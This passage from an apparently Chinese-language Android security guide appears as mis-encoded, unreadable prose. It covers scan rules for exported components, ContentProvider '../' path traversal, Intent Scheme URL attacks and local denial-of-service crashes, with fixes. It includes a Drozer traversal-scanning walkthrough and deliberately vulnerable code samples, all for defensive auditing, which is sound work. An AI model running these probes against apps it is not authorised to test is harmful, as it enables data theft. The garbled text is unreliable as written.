‡ç­¾ï¼Œåˆ™æœªè®¾ç½®exportedå±æ€§å€¼ï¼Œé»˜è®¤ä¼šè®¾ç½®ä¸ºtrueï¼Œå¦‚æœæ˜¯falseåˆ™æ˜¯å®‰å…¨çš„ï¼Œè‹¥æ˜¯trueï¼Œåˆ™è¿›è¡Œç¬¬ä¸‰æ­¥</li><li>åˆ¤æ–­android:permissionå±æ€§çš„å€¼ï¼Œç©ºï¼Œnormalï¼Œdangerousæ˜¯ä¸å®‰å…¨çš„ï¼Œsignatureã€signatureOrSystemæ˜¯å®‰å…¨çš„ã€‚</li></ol><p><strong>å»ºè®®ï¼š</strong></p><ul><li>æœ€å°åŒ–ç»„ä»¶æš´éœ²ã€‚å¯¹ä¸ä¼šå‚ä¸è·¨åº”ç”¨è°ƒç”¨çš„ç»„ä»¶æ·»åŠ <code>android:exported=false</code>å±æ€§</li><li>è®¾ç½®ç»„ä»¶è®¿é—®æƒé™ã€‚å¯¹è·¨åº”ç”¨é—´è°ƒç”¨çš„ç»„ä»¶æˆ–è€…å…¬å¼€çš„receiverã€serviceã€activityå’Œactivity-aliasè®¾ç½®æƒé™ï¼ŒåŒæ—¶å°†æƒé™çš„protectionLevelè®¾ç½®ä¸º<code>signature</code>æˆ–<code>signatureOrSystem</code></li><li>ç»„ä»¶ä¼ è¾“æ•°æ®éªŒè¯ã€‚å¯¹ç»„ä»¶ä¹‹é—´ï¼Œç‰¹åˆ«æ˜¯è·¨åº”ç”¨çš„ç»„ä»¶ä¹‹é—´çš„æ•°æ®ä¼ å…¥ä¸è¿”å›åšéªŒè¯å’Œå¢åŠ å¼‚å¸¸å¤„ç†ï¼Œé˜²æ­¢æ¶æ„è°ƒè¯•æ•°æ®ä¼ å…¥ï¼Œæ›´è¦é˜²æ­¢æ•æ„Ÿæ•°æ®è¿”å›</li></ul><h3 id="serviceç»„ä»¶å¯¼å‡ºæ£€æµ‹">serviceç»„ä»¶å¯¼å‡ºæ£€æµ‹</h3><p>Serviceç»„ä»¶å¯¹å¤–æš´éœ²ä¼šå¯¼è‡´æ•°æ®æ³„éœ²å’Œæ¶æ„çš„dosæ”»å‡»ã€‚</p><p><strong>é£é™©ç­‰çº§</strong>ï¼š <code>æé†’</code></p><p>æ£€æµ‹è§„åˆ™ï¼š</p><p>è§„åˆ™åŒ1</p><p><strong>å»ºè®®</strong>ï¼š</p><ul><li>æœ€å°åŒ–ç»„ä»¶æš´éœ²ã€‚å¯¹ä¸ä¼šå‚ä¸è·¨åº”ç”¨è°ƒç”¨çš„ç»„ä»¶æ·»åŠ <code>android:exported=false</code>å±æ€§</li><li>è®¾ç½®ç»„ä»¶è®¿é—®æƒé™ã€‚å¯¹è·¨åº”ç”¨é—´è°ƒç”¨çš„ç»„ä»¶æˆ–è€…å…¬å¼€çš„receiverã€serviceã€activityå’Œactivity-aliasè®¾ç½®æƒé™ï¼ŒåŒæ—¶å°†æƒé™çš„protectionLevelè®¾ç½®ä¸º<code>signature</code>æˆ–<code>signatureOrSystem</code></li><li>ç»„ä»¶ä¼ è¾“æ•°æ®éªŒè¯ã€‚å¯¹ç»„ä»¶ä¹‹é—´ï¼Œç‰¹åˆ«æ˜¯è·¨åº”ç”¨çš„ç»„ä»¶ä¹‹é—´çš„æ•°æ®ä¼ å…¥ä¸è¿”å›åšéªŒè¯å’Œå¢åŠ å¼‚å¸¸å¤„ç†ï¼Œé˜²æ­¢æ¶æ„è°ƒè¯•æ•°æ®ä¼ å…¥ï¼Œæ›´è¦é˜²æ­¢æ•æ„Ÿæ•°æ®è¿”å›</li></ul><h3 id="Receiverç»„ä»¶å¯¼å‡ºæ£€æµ‹">Receiverç»„ä»¶å¯¼å‡ºæ£€æµ‹</h3><p>Receiverç»„ä»¶å¯¹å¤–æš´éœ²ä¼šå¯¼è‡´æ•°æ®æ³„éœ²å’Œæ¶æ„çš„dosæ”»å‡»ã€‚</p><p>é£é™©ç­‰çº§ï¼š <code>æé†’</code></p><p>æ£€æµ‹è§„åˆ™ï¼š</p><p>è§„åˆ™åŒ1</p><p>å»ºè®®ï¼š</p><ul><li>æœ€å°åŒ–ç»„ä»¶æš´éœ²ã€‚å¯¹ä¸ä¼šå‚ä¸è·¨åº”ç”¨è°ƒç”¨çš„ç»„ä»¶æ·»åŠ <code>android:exported=false</code>å±æ€§</li><li>è®¾ç½®ç»„ä»¶è®¿é—®æƒé™ã€‚å¯¹è·¨åº”ç”¨é—´è°ƒç”¨çš„ç»„ä»¶æˆ–è€…å…¬å¼€çš„receiverã€serviceã€activityå’Œactivity-aliasè®¾ç½®æƒé™ï¼ŒåŒæ—¶å°†æƒé™çš„protectionLevelè®¾ç½®ä¸º<code>signature</code>æˆ–<code>signatureOrSystem</code></li><li>ç»„ä»¶ä¼ è¾“æ•°æ®éªŒè¯ã€‚å¯¹ç»„ä»¶ä¹‹é—´ï¼Œç‰¹åˆ«æ˜¯è·¨åº”ç”¨çš„ç»„ä»¶ä¹‹é—´çš„æ•°æ®ä¼ å…¥ä¸è¿”å›åšéªŒè¯å’Œå¢åŠ å¼‚å¸¸å¤„ç†ï¼Œé˜²æ­¢æ¶æ„è°ƒè¯•æ•°æ®ä¼ å…¥ï¼Œæ›´è¦é˜²æ­¢æ•æ„Ÿæ•°æ®è¿”å›</li></ul><h3 id="Providerç»„ä»¶å¯¼å‡ºæ£€æµ‹">Providerç»„ä»¶å¯¼å‡ºæ£€æµ‹</h3><p>providerç»„ä»¶å¯¼å‡ºå¯èƒ½ä¼šå¸¦æ¥ä¿¡æ¯æ³„éœ²éšæ‚£ã€‚API Levelåœ¨17ä»¥ä¸‹çš„æ‰€æœ‰åº”ç”¨çš„<code>android:exported</code>å±æ€§é»˜è®¤å€¼ä¸ºtrueï¼Œ17åŠä»¥ä¸Šé»˜è®¤å€¼ä¸ºfalseã€‚</p><p>é£é™©ç­‰çº§ï¼š<code>æé†’</code></p><p>æ£€æµ‹è§„åˆ™ï¼š</p><p>è§„åˆ™åŒ1</p><p>å»ºè®®ï¼š</p><ul><li>æœ€å°åŒ–ç»„ä»¶æš´éœ²ã€‚å¯¹ä¸ä¼šå‚ä¸è·¨åº”ç”¨è°ƒç”¨çš„ç»„ä»¶æ·»åŠ <code>android:exported=false</code>å±æ€§</li><li>è®¾ç½®ç»„ä»¶è®¿é—®æƒé™ã€‚å¯¹å¯¼å‡ºçš„providerç»„ä»¶è®¾ç½®æƒé™ï¼ŒåŒæ—¶å°†æƒé™çš„protectionLevelè®¾ç½®ä¸º<code>signature</code>æˆ–<code>signatureOrSystem</code></li><li>ç”±äºcontentprovideræ— æ³•åœ¨android2.2ï¼ˆAPI-8ï¼‰ç”³æ˜ä¸ºç§æœ‰ã€‚æ•…å»ºè®®å°†<code>minSdkVersion</code>è®¾ä¸º8ä»¥ä¸Šã€‚</li></ul><h3 id="ContentProviderç›®å½•éå†æ¼æ´æ£€æµ‹">ContentProviderç›®å½•éå†æ¼æ´æ£€æµ‹</h3><p>è¯¥æ¼æ´ç”±äºContent Providerç»„ä»¶æš´éœ²ï¼Œæ²¡æœ‰å¯¹è¿™ä¸ªç»„ä»¶è®¿é—®æƒé™è¿›è¡Œé™åˆ¶ä¸”å¯¹Uriè·¯å¾„æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œæ”»å‡»è€…é€šè¿‡Content Providerå®ç°çš„OpenFileæ¥å£è¿›è¡Œæ”»å‡»ï¼Œé€šè¿‡<code>../</code>çš„æ–¹å¼è®¿é—®ä»»æ„çš„ç›®å½•æ–‡ä»¶ï¼Œé€ æˆéšç§æ³„éœ²</p><p><strong>æ£€æµ‹ç­‰çº§</strong>ï¼šæé†’</p><p><strong>æ£€æµ‹æ–¹æ³•</strong>ï¼š</p><ol><li>æ‰¾åˆ°å¯¼å‡ºçš„providerç»„ä»¶</li><li>ä½¿ç”¨Androidå®‰å…¨åˆ†ææ¡†æ¶DrozeråŠ¨æ€åˆ†æAPKï¼Œéœ€è¦å®‰è£…å®‰å“æ¨¡æ‹Ÿå™¨ï¼ˆå®‰è£…äº†<em>Genymotion</em>ï¼ŒåŸºäºX86 + ARMæ”¯æŒåŒ…ï¼‰</li><li>ã€ä½¿ç”¨adb è¿›è¡Œç«¯å£è½¬å‘ï¼Œè½¬å‘åˆ°Drozerä½¿ç”¨çš„ç«¯å£31415<br>adb forward tcp:31415 tcp:31415</li><li>åœ¨å®‰å“è®¾å¤‡ä¸Šå¼€å¯Drozer Agent åœ¨PCä¸Šå¯åŠ¨Drozer<br><code>drozeer console connect</code></li><li>åœ¨Drozeræ§åˆ¶å°ä¸­ä½¿ç”¨å‘½ä»¤ï¼Œåˆ†æç›®æ ‡apkæ˜¯å¦å­˜åœ¨ç›®å½•éå†æ¼æ´<br><code>run scanner.provider.traversal -a &lt;package0-name&gt;</code></li></ol><p><strong>å»ºè®®</strong>ï¼š</p><ul><li><p>å°†ä¸å¿…è¦çš„Connect Providerè®¾ç½®ä¸ºä¸å¯å¯¼å‡º</p></li><li><p>ç”±äºAndroidç»„ä»¶Content Provideræ— æ³•åœ¨Android 2.2(API Level 8)ç³»ç»Ÿä¸Šè®¾ç½®ä¸å¯å¯¼å‡ºï¼Œå› æ­¤å¦‚æœå¸Œæœ›Content Providerä¸å¯å¯¼å‡ºï¼Œå»ºè®®å£°æ˜çš„æœ€ä½SDKç‰ˆæœ¬ä¸º8ä»¥ä¸Šç‰ˆæœ¬ï¼›ç”±äºAPI Level 17ä»¥ä¸‹çš„æ‰€æœ‰åº”ç”¨çš„<code>android:exported </code>é»˜è®¤å€¼éƒ½ä¸ºtrueï¼Œå› æ­¤å¦‚æœåº”ç”¨çš„Content Providerä¸å¿…è¦å¯¼å‡ºï¼Œå»ºè®®æ˜¾ç¤ºè®¾ç½®æ³¨å†Œçš„Content Providerç»„ä»¶çš„<code>android:exported</code>å±æ€§ä¸ºfalseï¼›ã€</p></li><li><p>å»é™¤æ²¡æœ‰å¿…è¦çš„OpenFile()æ¥å£</p></li><li><p>å¦‚æœåº”ç”¨çš„Content Providerç»„ä»¶æ²¡æœ‰å¿…è¦å®ç°<code>openFile()</code>æ¥å£ï¼Œé˜¿é‡Œèšå®‰å…¨å»ºè®®ç§»é™¤è¯¥Content Providerçš„ä¸å¿…è¦çš„<code>openFile()</code>æ¥å£</p></li><li><p>è¿‡æ»¤é™åˆ¶è·¨åŸŸè®¿é—®ï¼Œå¯¹è®¿é—®çš„ç›®æ ‡æ–‡ä»¶çš„è·¯å¾„è¿›è¡Œæœ‰æ•ˆåˆ¤æ–­</p></li><li><p>ä½¿ç”¨<code>Uri.decode()</code>å…ˆå¯¹Content Query Uriè¿›è¡Œè§£ç åï¼Œåœ¨è¿‡æ»¤å¦‚å¯é€šè¿‡<code>../</code>å®ç°ä»»æ„å¯è¯»æ–‡ä»¶çš„è®¿é—®çš„Uriå­—ç¬¦ä¸²</p></li><li><p>è®¾ç½®æƒé™æ¥è¿›è¡Œå†…éƒ¨åº”ç”¨é€šè¿‡Content Providerçš„æ•°æ®å…±äº«</p></li><li><p>ä½¿ç”¨ç­¾åéªŒè¯æ¥æ§åˆ¶Content Providerå…±äº«æ•°æ®çš„è®¿é—®æƒé™ï¼Œå¦‚è®¾ç½®<code>protectionLevel=signatureæˆ–signatureOrSystem</code></p></li><li><p>æä¾›assetæ–‡ä»¶æ—¶æ³¨æ„æƒé™ä¿æŠ¤</p></li><li><p>å…¬å¼€çš„content providerç¡®ä¿ä¸å­˜å‚¨æ•æ„Ÿæ•°æ®</p></li></ul><h3 id="Providerï¼šgrant-uri-permissionå±æ€§æ£€æµ‹">Providerï¼šgrant-uri-permissionå±æ€§æ£€æµ‹</h3><p>grant-uri-permissionè‹¥è®¾ç½®ä¸ºtrueï¼Œå¯è¢«å…¶ä»–ç¨‹åºå‘˜é€šè¿‡uriè®¿é—®åˆ°content providerå†…å®¹ï¼Œå®¹æ˜“é€ æˆä¿¡æ¯æ³„éœ²ï¼Œé»˜è®¤æ˜¯false</p><p>å¦‚æœä¸€ä¸ªProvideræ˜¯éå¯¼å‡ºç»„ä»¶çš„æ—¶å€™ï¼Œå½“è¿›è¡Œæ–‡ä»¶å…±äº«çš„æ—¶å€™éœ€è¦åœ¨Intentä¸­åŠ å…¥Grantç›¸å…³çš„flags</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">int</span> FLAG_GRANT_READ_URI_PERMISSION = <span class="number">0x00000001</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">int</span> FLAG_GRANT_WRITE_URI_PERMISSION = <span class="number">0x00000002</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">int</span> FLAG_GRANT_PERSISTABLE_URI_PERMISSION = <span class="number">0x00000040</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">int</span> FLAG_GRANT_PREFIX_URI_PERMISSION = <span class="number">0x00000080</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·startActivityå†…éƒ¨ä¼šåˆ¤æ–­ï¼Œå¦‚æœå«æœ‰è¿™äº›Grant flagï¼Œå°†ä¼šè¿›è¡Œä¸´æ—¶æ€§çš„Uriæˆæƒï¼Œä¹ŸåŒ…æ‹¬ä¸´çš„å°†providerç»„ä»¶exportç»™Intentçš„ç›®æ ‡åº”ç”¨ã€‚</p><p><strong>é£é™©ç­‰çº§</strong>ï¼šæé†’</p><p><strong>é—®é¢˜å®ä¾‹ï¼š</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>å»ºè®®ï¼š</strong></p><p>å¦‚æ— éœ€å¯¹å¤–æä¾›æ•°æ®ï¼Œåˆ™å°†content providerçš„<code>android:grantUriPermissions</code>è®¾ç½®ä¸ºfalseã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Intent-Basedæ”»å‡»æ£€æµ‹">Intent-Basedæ”»å‡»æ£€æµ‹</h3><p>åœ¨AndroidManifestæ–‡ä»¶ä¸­å®šä¹‰äº†android.intent.category .BROWSABLEå±æ€§çš„ç»„ä»¶ï¼Œå¯ä»¥é€šè¿‡æµè§ˆå™¨å”¤èµ·ï¼Œè¿™ä¼šå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´æ”»å‡»</p><p><strong>é£é™©ç­‰çº§</strong>ï¼šä½å±</p><p><strong>é—®é¢˜å®ä¾‹</strong>ï¼šActivityåªæœ‰é…ç½®äº†category filteræ‰æœ‰è¢«android.intent.category.BROWSABLEé€šè¿‡è¿™ç§æ–¹å¼åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ã€‚é€šè¿‡æ‰«æManifestä¸­çš„æ‰€æœ‰ç»„ä»¶ï¼Œæ£€æµ‹å‡ºæ‰€æœ‰ç»„ä»¶ä¸­çš„intent-filterå¸¦æœ‰<code>&lt;category android:name=&quot;android.intent.category.BROWSABLE&quot;/&gt;</code>å±æ€§çš„ï¼Œå°†å…¶æ ‡æ³¨ä¸ºé—®é¢˜ä»£ç ä»£ç æ®µï¼Œå¹¶æŠ¥å‡ºä½å±é£é™©çš„æç¤ºã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.BROWSABLE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>å»ºè®®</strong>ï¼š</p><ul><li>appä¸­ä»»ä½•æ¥æ”¶å¤–éƒ¨è¾“å…¥æ•°æ®çš„åœ°æ–¹éƒ½æ˜¯æ½œåœ¨çš„æ”»å‡»ç‚¹ï¼Œ<strong>æ£€æŸ¥å¹¶è¿‡æ»¤</strong>æ¥è‡ªç½‘é¡µçš„å‚æ•°</li><li>ä¸è¦é€šè¿‡ç½‘é¡µä¼ è¾“æ•æ„Ÿä¿¡æ¯ï¼Œæœ‰çš„ç½‘ç«™ä¸ºäº†å¼•å¯¼å·²ç»ç™»å½•ç”¨æˆ·åˆ°appä¸Šä½¿ç”¨ï¼Œä¼šä½¿ç”¨è„šæœ¬åŠ¨æ€çš„ç”ŸæˆURL Schemeçš„å‚æ•°ï¼Œå…¶ä¸­åŒ…æ‹¬ç”¨æˆ·åï¼Œå¯†ç æˆ–è€…ç™»å½•æ€tokenç™»æ•æ„Ÿä¿¡æ¯ï¼Œè®©ç”¨æˆ·æ‰“å¼€appç›´æ¥å°±ç™»å½•äº†ï¼Œæ¶æ„åº”ç”¨ä¹Ÿå¯ä»¥æ³¨å†Œç›¸åŒçš„URL Schemeæ¥æˆªå–è¿™äº›æ•æ„Ÿä¿¡æ¯ï¼ŒAndroidç³»ç»Ÿä¼šè®©ç”¨æˆ·é€‰æ‹©ä½¿ç”¨å“ªä¸€ä¸ªåº”ç”¨æ‰“å¼€é“¾æ¥ï¼Œä½†æ˜¯å¦‚æœç”¨æˆ·ä¸æ³¨æ„ï¼Œå°±ä¼šä½¿ç”¨æ¶æ„åº”ç”¨æ‰“å¼€ï¼Œå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²æˆ–è€…å…¶ä»–é£é™©ã€‚</li></ul><h3 id="Intent-Scheme-URLæ¼æ´æ”»å‡»">Intent Scheme URLæ¼æ´æ”»å‡»</h3><p>Intent Scheme URLæ˜¯ä¸€ç§ç‰¹æ®Šçš„URLæ ¼å¼ï¼Œç”¨æ¥é€šè¿‡webé¡µé¢å¯åŠ¨å·²ç»å®‰è£…åº”ç”¨çš„Activityç»„ä»¶ï¼Œå¤§å¤šæ•°ä¸»æµæµè§ˆå™¨éƒ½æ”¯æŒæ­¤åŠŸèƒ½ã€‚</p><p>Android Browserçš„æ”»å‡»æ‰‹æ®µ ==ã€‹Intent Scheme URLsæ”»å‡»ã€‚è¿™ç§æ”»å‡»æ–¹å¼åˆ©ç”¨äº†æµè§ˆå™¨ä¿æŠ¤æªæ–½ä¸è¶³ï¼Œé€šè¿‡æµè§ˆå™¨ä½œä¸ºæ¡¥æ¢é—´æ¥å®ç°Intent-Basedæ”»å‡»ã€‚ç›¸æ¯”äºæ™®é€šçš„Intent-Basedæ”»å‡»ï¼Œè¿™ç§æ–¹å¼å…·æœ‰éšè”½æ€§ã€‚</p><p>å¦‚æœappä¸­ï¼Œæ²¡æœ‰æ£€æŸ¥è·å–åˆ°çš„load_urlçš„å€¼ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ é’“é±¼ç½‘ç«™ï¼Œè¯±å¯¼ç”¨æˆ·ç‚¹å‡»åŠ è½½ï¼Œå°±å¯ä»¥ç›—å–ç”¨æˆ·ä¿¡æ¯ã€‚æ‰€ä»¥ï¼Œå¯¹Intent URIçš„çš„å¤„ç†ä¸å½“æ—¶ï¼Œå°±ä¼šå¯¼è‡´åŸºäºIntentçš„æ”»å‡»</p><p><strong>é£é™©ç­‰çº§</strong>ï¼šé«˜å±</p><p><strong>é—®é¢˜å®ä¾‹</strong>ï¼š</p><p>å¦‚æœæµè§ˆå™¨æ”¯æŒIntent Scheme URIè¯­æ³•ï¼Œä¸€èˆ¬ä¼šåˆ†ä¸‰ä¸ªæ­¥éª¤è¿›è¡Œå¤„ç†</p><ol><li>åˆ©ç”¨Intent.parseUriè§£æuriï¼Œè·å–åŸå§‹çš„Intentå¯¹è±¡</li><li>å¯¹intentå¯¹è±¡è®¾ç½®è¿‡æ»¤è§„åˆ™</li><li>é€šè¿‡Context.startActivityIfNeededæˆ–è€…Context.startActivityå‘é€intentï¼Œå…¶ä¸­ç¬¬äºŒæ­¥èµ·å…³é”®ä½œç”¨ï¼Œè¿‡æ»¤è§„åˆ™ç¼ºå¤±æˆ–è€…å­˜åœ¨ç¼ºé™·éƒ½ä¼šå¯¼è‡´Intent Scheme URLæ”»å‡»</li></ol><p>å…³é”®åœ¨äºIntent.parseUriå‡½æ•°ï¼Œæ¯”è¾ƒå®‰å…¨çš„ä½¿ç”¨Intent Scheme URIæ–¹æ³•æ˜¯ï¼Œå¦‚æœä½¿ç”¨äº†Intent.parseUriå‡½æ•°ï¼Œè·å–çš„intentå¯¹è±¡å¿…é¡»ä¸¥æ ¼è¿‡æ»¤ï¼Œintentè‡³å°‘åŒ…å«ä»¥ä¸‹ä¸‰ä¸ªç­–ç•¥</p><ul><li>addCategory(â€œandroid.intent.category.BROWSABLEâ€)</li><li>setComponent(null)</li><li>setSelector(null)</li></ul><p>é€šè¿‡æ‰«æå‡ºæ‰€æœ‰è°ƒç”¨äº†Intent.parseUriæ–¹æ³•çš„è·¯å¾„ï¼Œå¹¶æ£€æµ‹æ˜¯å¦ä½¿ç”¨äº†ä¸Šè¿°ä¸‰ä¸ªç­–ç•¥ï¼Œè‹¥éƒ½æ˜¯ç”¨äº†åˆ™å®‰å…¨ï¼Œå¦åˆ™é«˜å±</p><p>Intent.parseUriå‡½æ•°è¿”å›çš„Intentå¯¹è±¡éœ€è¦æŒ‰ç…§ä»¥ä¸‹æ–¹å¼è¿›è¡Œå®ç°ï¼Œæ‰å¯ä»¥è®¤ä¸ºæ˜¯å®‰å…¨çš„ã€‚</p><p><strong>å»ºè®®</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å°†intentçš„URI(intent scheme URL)è½¬æ¢ä¸ºintentå¯¹è±¡</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> Intent.parseUri(uri);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¦æ­¢åœ¨æ²¡æœ‰è®¾ç½®å¯æµè§ˆçš„ç›®å½•(BROWSABLE category)çš„æ—¶å€™å¯åŠ¨æ´»åŠ¨</span></span><br><span class="line">intent.addCategory(<span class="string">&quot;android.intent.category.BROWSABLE&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¦æ­¢æ˜¾å¼è°ƒç”¨(explicit call)</span></span><br><span class="line">intent.setComponent(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¦æ­¢intentçš„é€‰æ‹©å™¨(selector)</span></span><br><span class="line">intent.setSelector(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€šè¿‡intentå¯åŠ¨æ´»åŠ¨</span></span><br><span class="line">context.startActivityIfNeeded(intent, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="åº”ç”¨æœ¬åœ°æ‹’ç»æœåŠ¡æ¼æ´æ£€æµ‹">åº”ç”¨æœ¬åœ°æ‹’ç»æœåŠ¡æ¼æ´æ£€æµ‹</h3><p>Androidç³»ç»Ÿæä¾›äº†Activityï¼ŒServiceï¼ŒBroadcast Receiverç­‰ç»„ä»¶ï¼Œå¹¶ä¸”æä¾›äº†Intentæœºåˆ¶æ¥ååŠ©åº”ç”¨é—´çš„äº¤äº’å’Œé€šè®¯ï¼ŒIntentè´Ÿè´£å¯¹åº”ç”¨ä¸­ä¸€æ¬¡æ“ä½œçš„åŠ¨ä½œï¼ŒåŠ¨ä½œè®¾è®¡çš„æ•°æ®ï¼Œé™„åŠ æ•°æ®è¿›è¡Œæè¿°ï¼ŒAndoridç³»ç»Ÿæ ¹æ®æ­¤Intentçš„æè¿°ï¼Œè´Ÿè´£æ‰¾åˆ°å¯¹åº”çš„ç»„ä»¶ï¼Œå°†Intentä¼ é€’ç»™è°ƒç”¨çš„ç»„ä»¶ï¼Œå¹¶å®Œæˆç»„ä»¶çš„è°ƒç”¨ã€‚</p><p>Andoridåº”ç”¨æœ¬åœ°æ‹’ç»æœåŠ¡æ¼æ´æºäºç¨‹åºæ²¡æœ‰å¯¹Intent.GetxxxExtra()è·å–çš„å¼‚å¸¸æˆ–è€…ç•¸å½¢æ•°æ®å¤„ç†æ—¶æ²¡æœ‰è¿›è¡Œå¼‚å¸¸æ•è·ï¼Œä»è€Œå¯¼è‡´æ”»å‡»è€…å¯é€šè¿‡å‘å—å®³è€…åº”ç”¨å‘é€æ­¤ç±»ç©ºæ•°æ®ï¼Œå¼‚å¸¸æˆ–è€…ç•¸å½¢æ•°æ®æ¥è¾¾åˆ°ä½¿è¯¥åº”ç”¨Crashçš„ç›®çš„ï¼Œç®€å•çš„è¯´å°±æ˜¯æ”»å‡»è€…é€šè¿‡Inentå‘é€çš„ç©ºæ•°æ®ï¼Œå¼‚å¸¸æˆ–è€…ç•¸å½¢æ•°æ®ç»™å—å®³è€…åº”ç”¨ï¼Œå¯¼è‡´å…¶å´©æºƒ</p><p>**é£é™©ç­‰çº§ï¼š**ä½å±</p><p><strong>é—®é¢˜å®ä¾‹</strong>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æºäºç¨‹åºæ²¡æœ‰å¯¹getAction()ç­‰è·å–åˆ°çš„æ•°æ®è¿›è¡Œç©ºæŒ‡é’ˆåˆ¤æ–­ï¼Œä»è€Œå¯¼è‡´äº†ç©ºæŒ‡é’ˆå¼‚å¸¸å¯¼è‡´åº”ç”¨å´©æºƒ</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (i.getAction().equals(<span class="string">&quot;TestForNullPointerException&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    Log.d(<span class="string">&quot;TAG&quot;</span>, <span class="string">&quot;Test for Android Refuse Service Bug&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> Exception &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">abc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="type">Intent</span> <span class="variable">kkk</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="keyword">if</span> (abc.getAction().equals(<span class="string">&quot;TestForNullPointerException&quot;</span>)) &#123;</span><br><span class="line">    Log.d(<span class="string">&quot;TAG&quot;</span>, <span class="string">&quot;Test for Android Refuse Service Bug&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//æºäºç¨‹åºæ²¡æœ‰å¯¹getSerializableExtra()ç­‰è·å–åˆ°çš„æ•°æ®è¿›è¡Œç±»å‹åˆ¤æ–­è€Œè¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œä»è€Œå¯¼è‡´ç±»å‹è½¬æ¢å¼‚å¸¸å¯¼è‡´æ‹’ç»æœåŠ¡æ¼æ´</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">a</span> <span class="operator">=</span> getIntent();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">test</span> <span 